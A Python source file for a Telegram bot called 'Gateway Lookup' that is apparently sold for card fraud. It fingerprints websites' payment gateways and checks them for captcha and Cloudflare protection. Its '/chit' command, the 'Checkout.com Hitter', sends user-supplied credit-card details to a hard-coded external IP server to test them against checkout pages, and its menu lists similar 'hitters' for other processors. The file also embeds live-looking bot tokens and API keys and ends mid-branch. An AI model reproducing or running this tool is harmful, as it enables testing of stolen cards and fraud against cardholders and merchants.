from telethon import TelegramClient, events, types, Button
from telethon.tl import functions
from telethon.tl.types import Channel, Chat, User
import webbrowser
webbrowser.open('')
import time
import random
import re
import os
import requests
import json
import string
import urllib.parse
from bs4 import BeautifulSoup
from collections import defaultdict
from datetime import datetime, timedelta
api_id = '1747534' # Keep this as it is 
api_hash = '5a2684512006853f2e48aca9652d83ea' # same heree
client_token = "7920311542:AAGsX2Q60J-mFUm2Oj9o4KWJSNppUx3y_5M"

message_counts = defaultdict(lambda: 0)
last_message_time = defaultdict(lambda: datetime.min)
global time_window
time_window = timedelta(seconds=15)
pre_window = timedelta(seconds=10)
site_checking = {}
credits = {}
global credit
credit = {}
generated_codes = []
vip = [6652287427]
def normalize_url(url):
    parsed_url = urllib.parse.urlparse(url)
    normalized_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    return normalized_url
def generate_redeem_code():
    code = '-'.join(''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4)) for _ in range(4))
    cod=(f"`{code}`")
    return code

premium = "premium.txt"
if not os.path.exists(premium):
    open(premium, 'a').close()
        

def readprem():
    with open(premium, 'r') as file:
        premium_ids = file.readlines()
        premium_ids = [int(user_id.strip()) for user_id in premium_ids if user_id.strip().isdigit()]
        return premium_ids


pre = readprem()
x = pre
pre_id = []
r_us=[]

def add_to_premium(user_id):
    with open(premium, 'a') as file:
        file.write(str(user_id) + "\n")
client = TelegramClient('sesson_name', api_id, api_hash).start(bot_token=client_token)
site_checking = {}
def read_user_credit(user_id):
    user_credit_file = f"{user_id}_credit.txt"
    if os.path.exists(user_credit_file):
        with open(user_credit_file, "r") as file:
            return int(file.read())
    return 0
@client.on(events.NewMessage(pattern='/refresh'))
async def handle_create(event):
    user_id = event.sender_id

    # Read user's credit from file
    user_credit_file = f"{user_id}_credit.txt"
    if os.path.exists(user_credit_file):
        with open(user_credit_file, "r") as file:
            global credit_value
            credit_value = int(file.read())
    else:
        credit_value = 0


    if user_id in pre or pre_id:
        if user_id in r_us:
            await event.respond('𝗔𝗹𝗿𝗲𝗮𝗱𝘆 𝗿𝗲𝗳𝗿𝗲𝘀𝗵𝗶𝗻𝗴 𝗱𝗼𝗻𝗲!')
        else:
            credit_value += 25
            await event.respond('🌟')
            r_us.append(user_id)
            
    elif user_id in vip:
        if user_id in r_us:
            await event.respond('𝗔𝗹𝗿𝗲𝗮𝗱𝘆 𝗿𝗲𝗳𝗿𝗲𝘀𝗵𝗶𝗻𝗴 𝗱𝗼𝗻𝗲!')
        else:
            credit_value += 50000
            await event.respond('👑')
    else:
        if user_id in r_us:
            await event.respond('𝗔𝗹𝗿𝗲𝗮𝗱𝘆 𝗿𝗲𝗳𝗿𝗲𝘀𝗵𝗶𝗻𝗴 𝗱𝗼𝗻𝗲!')
        else:
            credit_value += 5
        await event.respond('✨')
        r_us.append(user_id)
    with open(user_credit_file, "w") as file:
        file.write(str(credit_value))
@client.on(events.NewMessage(pattern='/info'))
async def handle_create(event):
    user_id = event.sender_id
    user_credit_file = f"{user_id}_credit.txt"
    if os.path.exists(user_credit_file):
        with open(user_credit_file, "r") as file:
            user_credit = int(file.read())
    else:
        user_credit = 0
    if user_id in vip:
        user = event.sender
        user_id = event.sender.id
        creditz = credit.get(user_id,0)
        fn = f"[{user.first_name}](tg://user?id={user.id})"
        ai = f"[{user.id}!](tg://user?id={user.id})"
        await event.respond(f"""**Your Details** 🔐
𝙒𝙚𝙡𝙘𝙤𝙢𝙚 {fn}
**See your account status:**

👨🏻‍💼 Rank: `VIP 👑`
💳 Credits left: `♾️`

🔥 Status:
⊛ Account ID: `{event.sender.id}`
⊛ Name: {fn}""", reply_to=event)
    elif user_id in pre or pre_id:
        user = event.sender
        user_id = event.sender.id
        creditx = credit.get(user_id,0)
        fn = f"[{user.first_name}](tg://user?id={user.id})"
        ai = f"[{user.id}!](tg://user?id={user.id})"
        await event.respond(f"""**Your Details** 🔐
𝙒𝙚𝙡𝙘𝙤𝙢𝙚 {fn}
**See your account status:**

👨🏻‍💼 Rank: `Premium`
💳 Credits left: `{user_credit}`

🔥 Status:
⊛ Account ID: `{event.sender.id}`
⊛ Name: {fn}""", reply_to=event)
    else:
        user = event.sender
        user_id = event.sender.id
        creditz = credit.get(user_id)
        fn = f"[{user.first_name}](tg://user?id={user.id})"
        ai = f"[{user.id}!](tg://user?id={user.id})"
        
        await event.respond(f"""**Your Details** 🔐
𝙒𝙚𝙡𝙘𝙤𝙢𝙚 {fn}
**See your account status:**

👨🏻‍💼 Rank: `Free`
💳 Credits left: `{user_credit}`

🔥 Status:
⊛ Account ID: `{event.sender.id}`
⊛ Name: {fn}""", reply_to=event)
@client.on(events.NewMessage(pattern='/codes'))
async def handle_create(event):
    user_id = event.sender_id
    if user_id in vip:
        await event.respond('🔹𝗧𝗵𝗲𝘀𝗲 𝗮𝗿𝗲 𝘁𝗵𝗲 𝗖𝗼𝗱𝗲𝘀 𝘄𝗵𝗶𝗰𝗵 𝘄𝗲𝗿𝗲 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗮𝗻𝗱 𝗻𝗼𝘁 𝘂𝘀𝗲𝗱 𝘆𝗲𝘁. \n\n'+str(generated_codes))
@client.on(events.NewMessage(pattern='/create'))
async def handle_create(event):
    user_id = event.sender_id
    if user_id in vip:
        try:
            _, num_codes = event.raw_text.split()
            num_codes = int(num_codes)
            codes = [generate_redeem_code() for _ in range(num_codes)]
            generated_codes.extend(codes)
            code_message = ' ┏━━━━━━━⍟\n┃ 𝗛𝗲𝗿𝗲 𝗶𝘀 𝘆𝗼𝘂𝗿 𝗥𝗲𝗱𝗲𝗲𝗺 𝗰𝗼𝗱𝗲𝘀 ✅\n┗━━━━━━━━━━━⊛\n\n⊙ ' + '\n⊙ '.join(f'`{code}`' for code in codes) + ' \n\n━━━━━━━━━━━━━━━━\nPlease note that `02` credits each. You can redeem them using the command \n`/redeem` (@gatelookupbot)'
            await event.respond(code_message, parse_mode='Markdown')
        except (ValueError, TypeError):
            pass

def generate_redeem_code():
    code = '-'.join(''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4)) for _ in range(4))
    return code


@client.on(events.NewMessage(pattern='/redeem'))
async def handle_redeem(event):
    redeem_code = event.raw_text.split()[-1].strip()
    if redeem_code in generated_codes:
        generated_codes.remove(redeem_code)
        user_id = event.sender.id
        global creditz
        
        user_credit_file = f"{user_id}_credit.txt"
        if os.path.exists(user_credit_file):
            with open(user_credit_file, "r") as file:
                credit_value = int(file.read())
        else:
            credit_value = 0
        new_credit_value = credit_value + 2
        
        with open(user_credit_file, "w") as file:
            file.write(str(new_credit_value))
        msg = (f"""**New User Redeemed** ✅

__𝐔𝐬𝐞𝐫 𝐃𝐞𝐭𝐚𝐢𝐥𝐬__ :
⊛ **Username** : @{event.sender.username}
⊛ **Userid** : `{event.sender.id}`
⊛ **Code** : `{redeem_code}`
⊛ **Bot** : @gatelookupbot""")
        await client.send_message(-1002146645497,msg)
        
        
        await event.respond(f"𝗥𝗲𝗱𝗲𝗲𝗺𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅\n\n__𝗗𝗲𝘁𝗮𝗶𝗹𝘀__ :  \n**⊛ Credits Added** : `02` \n**[⊙](https://i.ibb.co/CMcdMjf/Blue-Tosca-Geometric-Technology-Linkedln-Banner.png) User ID** : `{event.sender_id}`\n\n❛ ━━━━･━━━━･━━━━ ❜", parse_mode='Markdown', reply_to=event)
    else:
        await event.respond('⚠️ 𝗧𝗵𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲𝗱 𝗿𝗲𝗱𝗲𝗲𝗺 𝗰𝗼𝗱𝗲 𝗶𝘀 𝗶𝗻𝘃𝗮𝗹𝗶𝗱 𝗼𝗿 𝗵𝗮𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗯𝗲𝗲𝗻 𝗿𝗲𝗱𝗲𝗲𝗺𝗲𝗱. \n𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗰𝗼𝗱𝗲...', reply_to=event)
        
@client.on(events.NewMessage(pattern='/addp'))
async def approve_user(event):
    global premium_file_path
    if event.sender_id in vip:
        try:
            user_id = int(event.text.split(" ")[1])
            add_to_premium(user_id)
            pre_id.append(user_id)
            print(pre_id)
            print(pre)
            
            await event.respond(f"**Successfully** Added {user_id} to \n**Premium Subscription.** ✅", reply_to=event)
        except (IndexError, ValueError):
            await event.respond("**⚠ Invalid usage. The correct format is:** `/addp <user_id>`", reply_to=event)
def find_payment_gateways(response_text):
    detected_gateways = []

    if "paypal" in response_text.lower():
        detected_gateways.append("PayPal")
    if "stripe" in response_text.lower():
        detected_gateways.append("Stripe")
    if "braintree" in response_text.lower():
        detected_gateways.append("Braintree")
    if "square" in response_text.lower():
        detected_gateways.append("Square")
    if "cybersource" in response_text.lower():
        detected_gateways.append("Cybersource")    
    if "authorize.net" in response_text.lower():
        detected_gateways.append("Authorize.Net")
    if "2checkout" in response_text.lower():
        detected_gateways.append("2Checkout")
    if "adyen" in response_text.lower():
        detected_gateways.append("Adyen")
    if "worldpay" in response_text.lower():
        detected_gateways.append("Worldpay")
    if "sagepay" in response_text.lower():
        detected_gateways.append("SagePay")
    if "checkout.com" in response_text.lower():
        detected_gateways.append("Checkout.com")
    if "shopify" in response_text.lower():
        detected_gateways.append("Shopify")
    if "razorpay" in response_text.lower():
        detected_gateways.append("Razorpay") 
    if "bolt" in response_text.lower():
        detected_gateways.append("Bolt")  
    if "paytm" in response_text.lower():
        detected_gateways.append("Paytm")    
    if "venmo" in response_text.lower():
        detected_gateways.append("Venmo")    
    if "pay.google.com" in response_text.lower():
        detected_gateways.append("Google pay")    
    if "revolut" in response_text.lower():
        detected_gateways.append("Revolut")    
    if "eway" in response_text.lower():
        detected_gateways.append("Eway")
    if "woocommerce" in response_text.lower():
        detected_gateways.append("Woocommerce")  
    if "upi" in response_text.lower():
        detected_gateways.append("UPI")
    if "apple.com" in response_text.lower():
        detected_gateways.append("Apple pay")  
    if "payflow" in response_text.lower():
        detected_gateways.append("PayFlow") 
    if "payeezy" in response_text.lower():
        detected_gateways.append("Payeezy")  
    if "paddle" in response_text.lower():
        detected_gateways.append("Paddle")  
    if "payoneer" in response_text.lower():
        detected_gateways.append("Payoneer")  
    if "recurly" in response_text.lower():
        detected_gateways.append("Recurly")  
    if "klarna" in response_text.lower():
        detected_gateways.append("Klarna")  
    if "paysafe" in response_text.lower():
        detected_gateways.append("Paysafe")  
    if "webmoney" in response_text.lower():
        detected_gateways.append("WebMoney")  
    if "payeer" in response_text.lower():
        detected_gateways.append("Payeer")  
    if "payu" in response_text.lower():
        detected_gateways.append("Payu")    
    if "skrill" in response_text.lower():
        detected_gateways.append("Skrill")     
    # Add more checks for other payment gateways

    # If no specific patterns are found, return "Unknown"
    if not detected_gateways:
        detected_gateways.append("Unknown")

    return detected_gateways
    

def find_payment_gateway(url):
    try:
        response = requests.get(url)
        response.raise_for_status()

        # Pass the response text to the find_payment_gateways function
        detected_gateways = find_payment_gateways(response.text)

        return detected_gateways

    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")
        return ["Error"]
async def is_user_in_channel(user_id, channel_id):
    try:
        participants = await client.get_participants(channel_id)
        members_ids = [participant.id for participant in participants]
        return user_id in members_ids
    except Exception as e:
        print(f"Error checking channel membership: {e}")
        return False

@client.on(events.NewMessage(pattern='/start'))
@client.on(events.NewMessage(pattern='/help'))
@client.on(events.NewMessage(pattern='/cmds'))
async def cmd_start(event):
    buttons = [
        Button.inline('🔎 Menu', b'cmd')
    ]
    textd = f"""
🤖 **Bot Status: Active** ✅

📢 Join Support chat [here](t.me/cobandchat) for Free credits.

💡 Note: To use [𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐥𝐨𝐨𝐤𝐮𝐩](t.me/gatelookupbot) in your group, Make sure to set it as an admin.
"""
    edit = await event.respond(textd, buttons=buttons, link_preview=False)
import re
def extract_urls(text):
    return re.findall(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', text)
@client.on(events.NewMessage(pattern='/mg'))
async def handle_new_message(event):
    if event.is_reply and event.message.reply_to_msg_id:
        # Check if the user is Premium or VIP
        user_id = event.sender_id
        if user_id not in pre_id and user_id not in pre and user_id not in vip:
            await event.respond("**⚠️ This feature is only Accesible for Premium and VIP Subscribers.**\n**Type /help to Unlock Premium 🌟**")
            return

        # Rest of your existing code for handling the message
        replied_msg = await event.get_reply_message()
        if replied_msg.file:
            file = await replied_msg.download_media()
            
            # Check the file size
            file_size = os.path.getsize(file)
            if file_size > 3000:
                await event.respond("**⚠ File size exceeds the limit (3KB).\nPlease upload a Smaller txt file.**", reply_to=event)
                return

            delete = await event.respond('**⚙ Started Checking...**', reply_to=event)
            with open(file, 'r') as file:
                text_content = file.read()
                line = len(text_content)
                print(line)
                text_content = text_content.split('\n')
                print("Done")
                print("Do")
                if line > 100:
                    for url in text_content:
                        print("K")
                        try:
                            if not url.startswith(("http://", "https://")):
                                url = "http://" + url
                                gates = find_payment_gateway(url)
                                domain = url.split('//')[-1].split('/')[0]
                                response = requests.get("http://" +domain)
                                html_content = response.text
                                captcha = ('captcha' in html_content.lower() or
                       'protected by reCAPTCHA' in html_content.lower() or
                       "I'm not a robot" in html_content.lower() or
                       'Recaptcha' in html_content or
                       "recaptcha/api.js" in html_content)
                                cloudflare = ("Cloudflare" in html_content or
                          "cdnjs.cloudflare.com" in html_content or
                          "challenges.cloudflare.com" in html_content)
                                msg = f"""┏━━━━━━━⍟\n┃ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗳𝗲𝘁𝗰𝗵𝗲𝗱 ✅\n┗━━━━━━━━━━━━⊛\n 𝗦𝗶𝘁𝗲 -» `{domain}`\n• 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 ➜ {', '.join(gates)}\n• 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 ➜ Captcha : {'✅' if captcha else '⛔'}\n                        Cloudflare : {'✅' if cloudflare else '⛔'}\n━━━━━━━━━━━━━━━\n[◈](https://i.ibb.co/CMcdMjf/Blue-Tosca-Geometric-Technology-Linkedln-Banner.png) 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆 {event.sender.first_name}\n[◈](https://i.ibb.co/CMcdMjf/Blue-Tosca-Geometric-Technology-Linkedln-Banner.png) 𝐁𝐨𝐭 [𝗚𝗮𝘁𝗲𝘄𝗮𝘆 𝗟𝗼𝗼𝗸𝘂𝗽](https://t.me/gatelookupbot)\n❝ ━━━━・『ᏰᏂ』・━━━━ ❞"""
                                await event.respond(msg, reply_to=event)
                                await client.send_message(-1002146645497,msg)
                                
                                
                            else:
                                gates = find_payment_gateway(url)
                                domain = url.split('//')[-1].split('/')[0]
                                response = requests.get("http://" +domain)
                                html_content = response.text
                                captcha = ('captcha' in html_content.lower() or
                       'protected by reCAPTCHA' in html_content.lower() or
                       "I'm not a robot" in html_content.lower() or
                       'Recaptcha' in html_content or
                       "recaptcha/api.js" in html_content)
                                cloudflare = ("Cloudflare" in html_content or
                          "cdnjs.cloudflare.com" in html_content or
                          "challenges.cloudflare.com" in html_content)
                                msg = f"""┏━━━━━━━⍟\n┃ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗳𝗲𝘁𝗰𝗵𝗲𝗱 ✅\n┗━━━━━━━━━━━━⊛\n 𝗦𝗶𝘁𝗲 -» `{domain}`\n• 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 ➜ {', '.join(gates)}\n• 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 ➜ Captcha : {'✅' if captcha else '⛔'}\n                        Cloudflare : {'✅' if cloudflare else '⛔'}\n━━━━━━━━━━━━━━━\n[◈](https://i.ibb.co/CMcdMjf/Blue-Tosca-Geometric-Technology-Linkedln-Banner.png) 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆 {event.sender.first_name}\n[◈](https://i.ibb.co/CMcdMjf/Blue-Tosca-Geometric-Technology-Linkedln-Banner.png) 𝐁𝐨𝐭 [𝗚𝗮𝘁𝗲𝘄𝗮𝘆 𝗟𝗼𝗼𝗸𝘂𝗽](https://t.me/gatelookupbot)\n❝ ━━━━・『ᏰᏂ』・━━━━ ❞"""
                                await event.respond(msg, reply_to=event)
                                await client.send_message(-1002146645497,msg)

                        except Exception as e:
                            print(e)
                    await event.respond("**✅ Checking Completed.\nThanks for using @gatelookupbot ❤**", reply_to=event)
                    await delete.delete()
                else:
                    await event.respond("**⚠ File Size is too less to check!\n\nDon't Test my efficiency 😁 baby.**", reply_to=event)
 
# Define a function to handle incoming messages
@client.on(events.NewMessage(pattern='/chit'))
async def auto_message(event):
    try:
        # Check if the user is Premium or VIP
        user_id = event.sender_id
        if user_id not in pre_id and user_id not in pre and user_id not in vip:
            await event.respond("**⚠️ This feature is only Accesible for Premium and VIP Subscribers.**\n**Type /help to Unlock Premium 🌟**", reply_to=event)
            return

        # Extract the parameters from the message
        message = event.message.message
        cc_details = message.split()[1]
        checkout_url = message.split()[2]

        start_time = time.time()
        processing_message = await event.respond("**Processing...**", reply_to=event)

        api_response = requests.get(f'http://77.47.142.107/checkout?lista={cc_details}&checkout_url={checkout_url}')

        bin_number = cc_details.split('|')[0][:6]
        bin_info_response = requests.get(f"https://api.dlyar-dev.tk/info-bin?bin={bin_number}").json()

        end_time = time.time()
        time_taken = round(end_time - start_time, 2)


        api_response_text = api_response.text.replace('"error":', '').replace('{', '').replace('}', '').replace('"', '').replace('  status: failure', '').replace(',', '').replace('checkout.error: list index out of range', 'Card OTP Needed').replace('payment_attempts_exceeded', 'Your Invoice has been Voided!')
        api_response_text = api_response_text.strip()


        redirect_url = None
        if 'redirect: ' in api_response_text:
            redirect_url = api_response_text.split('redirect: ')[1].split()[0]
            # Remove the redirect URL from the API response text
            api_response_text = api_response_text.replace('redirect: ' + redirect_url, '')

        # Format the API response
        formatted_response ="┏━━━━━━━⍟\n"
        formatted_response += f"┃ **Checkout.com Hitter** ✅\n"
        formatted_response += f"┗━━━━━━━━━━━━━⍟\n"
        formatted_response += f"**⊛ CC:** `{cc_details}`\n"
        formatted_response += f"**⊛ Response:** `{api_response_text}`\n"
        if redirect_url:
            formatted_response += f"**⊛ Redirect Url: [Click Here]**({redirect_url})\n"
        else:
            formatted_response += f"**⊛ Redirect Url: [Click Here]**({checkout_url})\n"
        formatted_response += "━━━━━━━━━━━━━━━━━━━━━\n"

        if bin_info_response["status"] == True:
            formatted_response += f"**[◈](https://i.ibb.co/CMcdMjf/Blue-Tosca-Geometric-Technology-Linkedln-Banner.png) Bin:** `{bin_info_response['scheme']}-{bin_info_response['type']}-{bin_info_response['brand']}`\n"
            formatted_response += f"**[◈](https://i.ibb.co/CMcdMjf/Blue-Tosca-Geometric-Technology-Linkedln-Banner.png) Country:** `{bin_info_response['country']} {bin_info_response['flag']}`\n"
        formatted_response += f"**[◈](https://i.ibb.co/CMcdMjf/Blue-Tosca-Geometric-Technology-Linkedln-Banner.png) Proxy: Live** 🌐\n"
        formatted_response += f"**⊛ Time taken:** `{time_taken}`s\n"
        formatted_response += f"**⊛ Hitted by:** @{event.sender.username}\n\n"
        formatted_response += "  ❝ ━━━━━━『ᏰᏂ』━━━━━━ ❞"

        # Edit the "Processing..." message to the final response
        await processing_message.edit(formatted_response, link_preview=False)

    except IndexError:
        # Warn if the command is used in the wrong format
        await event.respond("⚠ 𝗪𝗿𝗼𝗻𝗴 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!\n𝗨𝘀𝗲 `/chit <cc> <checkout_url>`", reply_to=event)

@client.on(events.CallbackQuery(data=b'cmd'))
async def cmd_callback(event):
    try:
        buttons = [
            [Button.inline("🔍 Lookup", b"lookup"), Button.inline("💳 Credits", b"credits")],
            [Button.inline("👨🏻‍💼 Status", b"status"), Button.inline("🌟 More Features", b"oc")],
                        [Button.inline("🚀 Unlock Premium", b"premium")],
            [Button.inline("Terminate", b"terminate")]
        ]
        await event.edit("**🤖 Welcome to Menu of [𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐥𝐨𝐨𝐤𝐮𝐩](t.me/gatelookupbot)!**\n**🔔 Notification:** Checkout.com Hitter added. Try /chit [Premium/VIP]", buttons=buttons, link_preview=False)
    except Exception as e:
        print(e)

@client.on(events.CallbackQuery(data=b'lookup'))
async def lookup_callback(event):
    try:
        buttons = [
            [Button.inline("Menu", b"cmd")]
        ]
        await event.edit("**[[•](t.me/gatelookupbot)] Site Lookup**\n**[[•](t.me/gatelookupbot)] Usage:** `/url <your_site>`\n**[[•](t.me/gatelookupbot)] Rank: Free/Premium/VIP**\n**[[•](t.me/gatelookupbot)] Status: ON ✅**\n━━━━━━━━━━━━━━━\n**[[•](t.me/gatelookupbot)] Mass site Lookup**\n**[[•](t.me/gatelookupbot)] Usage:** `/mg <reply to txt file>`\n**[[•](t.me/gatelookupbot)] Rank: Premium/VIP**\n**[[•](t.me/gatelookupbot)] Status: ON ✅**", buttons=buttons, link_preview=False)
    except Exception as e:
        print(e)

@client.on(events.CallbackQuery(data=b'credits'))
async def credits_callback(event):
    try:
        buttons = [
            [Button.inline("Menu", b"cmd")]
        ]
        await event.edit("**[[•](t.me/gatelookupbot)] Redeem code**\n**[[•](t.me/gatelookupbot)] Usage:** `/redeem <code>`\n**[[•](t.me/gatelookupbot)] Status: ON ✅**\n\n**❓ Need Free credits? Join [here](t.me/cobandchat)**", buttons=buttons, link_preview=False)
    except Exception as e:
        print(e)

@client.on(events.CallbackQuery(data=b'status'))
async def status_callback(event):
    try:
        buttons = [
            [Button.inline("Menu", b"cmd")]
        ]
        await event.edit("**[[•](t.me/gatelookupbot)] Account status**\n**[[•](t.me/gatelookupbot)] Usage: `/info`\n**[[•](t.me/gatelookupbot)] Status: ON ✅", buttons=buttons, link_preview=False)
    except Exception as e:
        print(e)

@client.on(events.CallbackQuery(data=b'oc'))
async def other_commands_callback(event):
    try:
        buttons = [
            [Button.inline("Menu", b"cmd")]
        ]
        await event.edit("**[[•](t.me/gatelookupbot)] Checkout.com Hitter**\n**[[•](t.me/gatelookupbot)] Usage:** `/chit <cc> <checkout_url>`\n**[[•](t.me/gatelookupbot)] Rank: Premium/VIP**\n**[[•](t.me/gatelookupbot)] Status: ON ✅**\n━━━━━━━━━━━━━━━\n**[[•](t.me/gatelookupbot)] Adyen.com Hitter**\n**[[•](t.me/gatelookupbot)] Usage:** `/ahit <cc> <checkout_url>`\n**[[•](t.me/gatelookupbot)] Rank: Premium/VIP**\n**[[•](t.me/gatelookupbot)] Status: OFF ❌**\n━━━━━━━━━━━━━━━\n**[[•](t.me/gatelookupbot)] Sellix.io Hitter**\n**[[•](t.me/gatelookupbot)] Usage:** `/xhit <cc> <invoice_url>`\n**[[•](t.me/gatelookupbot)] Rank: Premium/VIP**\n**[[•](t.me/gatelookupbot)] Status: OFF ❌**\n━━━━━━━━━━━━━━━\n**[[•](t.me/gatelookupbot)] Stripe.invoice.com Hitter**\n**[[•](t.me/gatelookupbot)] Usage:** `/ihit <cc> <invoice_url>`\n**[[•](t.me/gatelookupbot)] Rank: Premium/VIP**\n**[[•](t.me/gatelookupbot)] Status: OFF ❌**", buttons=buttons, link_preview=False)
    except Exception as e:
        print(e)

@client.on(events.CallbackQuery(data=b'premium'))
async def premium_callback(event):
    try:
        buttons = [
            [Button.inline("Menu", b"cmd")]
        ]
        await event.edit("**Head Over to @kiltes ✨ to buy Gateway Lookup bot's Premium Access ✅**", buttons=buttons, link_preview=False)
    except Exception as e:
        print(e)

@client.on(events.CallbackQuery(data=b'terminate'))
async def terminate(event):
    await event.edit("Terminating..")
    await event.delete()
  
@client.on(events.NewMessage(pattern='/gate'))
async def cmd_start(event):
    try:
        await event.respond("⚠ 𝗪𝗿𝗼𝗻𝗴 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!\n𝗨𝘀𝗲 `/url instagram.com`", reply_to=event)
    except Exception as e:
        print(e)


@client.on(events.NewMessage(pattern='/url'))
async def report(event):
    global user_credit_file
    user_id = event.sender.id
    global rw
    global tx
    rw = event.raw_text
    tx = event.text
    nu=None        
            
    creditx = credit.get(user_id, 0)
    user_credit_file = f"{user_id}_credit.txt"
    if os.path.exists(user_credit_file):
                with open(user_credit_file, "r") as file:
                    credit_value = int(file.read())
    else:
                credit_value = 0
    if event.text.strip() == "/url":
        await event.respond("⚠ 𝗪𝗿𝗼𝗻𝗴 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗳𝗼𝗿𝗺𝗮𝘁!\n𝗨𝘀𝗲 `/url instagram.com`", reply_to=event)
        return            
    if credit_value <= 0:
        await event.respond('**🤖 Credits Finished! Try /refresh** or \nBuy 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 (/help) for Unlimited usage 👑.',reply_to=event)
    else:
                global edit
                edit = await event.respond('𝗬𝗼𝘂𝗿 𝗥𝗲𝗾𝘂𝗲𝘀𝘁 𝗶𝘀 𝗶𝗻 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀...', reply_to=event)
                global start_time
                start_time = time.time()
                site_checking[user_id] = {"step": 1}
   

def minus(user_id):
        user_credit_file = f"{user_id}_credit.txt"
        if os.path.exists(user_credit_file):
            with open(user_credit_file, "r") as file:
                credit_value = int(file.read())
        else:
            credit_value = 0
        new_credit_value = credit_value - 1
        
        with open(user_credit_file, "w") as file:
            file.write(str(new_credit_value))

@client.on(events.NewMessage(func=lambda event: event.sender_id in site_checking))
async def report_step(event):
    global user_credit_file
    try:
        if '.' in rw:
            user_id = event.sender_id
            url = tx.split(" ")[1]
            w_url = normalize_url(url)
            global domain
            domain = url.split('//')[-1].split('/')[0]
            response = requests.get("http://" +domain)
            html_content = response.text
            captcha = ('captcha' in html_content.lower() or
                       'protected by reCAPTCHA' in html_content.lower() or
                       "I'm not a robot" in html_content.lower() or
                       'Recaptcha' in html_content or
                       "recaptcha/api.js" in html_content)
            cloudflare = ("Cloudflare" in html_content or
                          "cdnjs.cloudflare.com" in html_content or
                          "challenges.cloudflare.com" in html_content)

            website_url = domain
            if not website_url.startswith(("http://", "https://")):
                w_url = "http://" + website_url
                payment_gateways = find_payment_gateway(w_url)
                if "Error" in payment_gateways:
                    await event.edit("Provide Valid URL, or Maybe Site issue :)")
                elif "Unknown" in payment_gateways:
                    ch_name = 'coband'
                    ch_id = 'coband'
                    ch = f"[{ch_name}](https://t.me/{ch_id})"
                    end_time = time.time()
                    time_taken = end_time - start_time
                    rounded_time_taken = round(time_taken, 2)
                    await edit.edit(f""" ┏━━━━━━━⍟\n┃ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗳𝗲𝘁𝗰𝗵𝗲𝗱 ✅\n┗━━━━━━━━━━━━⊛\n 𝗦𝗶𝘁𝗲 -» `{domain}`\n• 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 ➜ unknown\n━━━━━━━━━━━━━━━\n[◈](https://i.ibb.co/CMcdMjf/Blue-Tosca-Geometric-Technology-Linkedln-Banner.png) 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧 : `{rounded_time_taken}``s`\n[◈](https://i.ibb.co/CMcdMjf/Blue-Tosca-Geometric-Technology-Linkedln-Banner.png) 𝐁𝐨𝐭 [𝗚𝗮𝘁𝗲𝘄𝗮𝘆 𝗟𝗼𝗼𝗸𝘂𝗽](https://t.me/gatelookupbot)\n❝ ━━━━・{ch}・━━━━ ❞""")
                if event.sender.id in pre_id or event.sender.id in pre:
                        user = event.sender
                        checked = f"[{user.first_name}](tg://user?id={user.id})" if user.username else user.first_name
                        ch_name = 'coband'
                        ch_id = 'coband'
                        ch = f"[{ch_name}](https://t.me/{ch_id})"
                        end_time = time.time()
                        time_taken = end_time - start_time
                        rounded_time_taken = round(time_taken, 2)
                        user_id = event.sender.id
                        minus(user_id)
                        msg=await edit.edit(f""" ┏━━━━━━━⍟\n┃ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗳𝗲𝘁𝗰𝗵𝗲𝗱 ✅\n┗━━━━━━━━━━━━⊛\n 𝗦𝗶𝘁𝗲 -» `{domain}`\n• 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 ➜ {', '.join(payment_gateways)}\n• 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 ➜ Captcha : {'✅' if captcha else '⛔'}\n                        Cloudflare : {'✅' if cloudflare else '⛔'}\n━━━━━━━━━━━━━━━\n[◈](https://i.ibb.co/CMcdMjf/Blue-Tosca-Geometric-Technology-Linkedln-Banner.png) 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧 : `{rounded_time_taken}``s`\n[◈](https://i.ibb.co/CMcdMjf/Blue-Tosca-Geometric-Technology-Linkedln-Banner.png) 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆 {checked} [𝗣𝗿𝗲𝗺𝗶𝘂𝗺]\n[◈](https://i.ibb.co/CMcdMjf/Blue-Tosca-Geometric-Technology-Linkedln-Banner.png) 𝐁𝐨𝐭 [𝗚𝗮𝘁𝗲𝘄𝗮𝘆 𝗟𝗼𝗼𝗸𝘂𝗽](https://t.me/gatelookupbot)\n❝ ━━━━・{ch}・━━━━ ❞""")
                        await client.send_message(-1002146645497,msg)

                elif event.sender.id in vip:
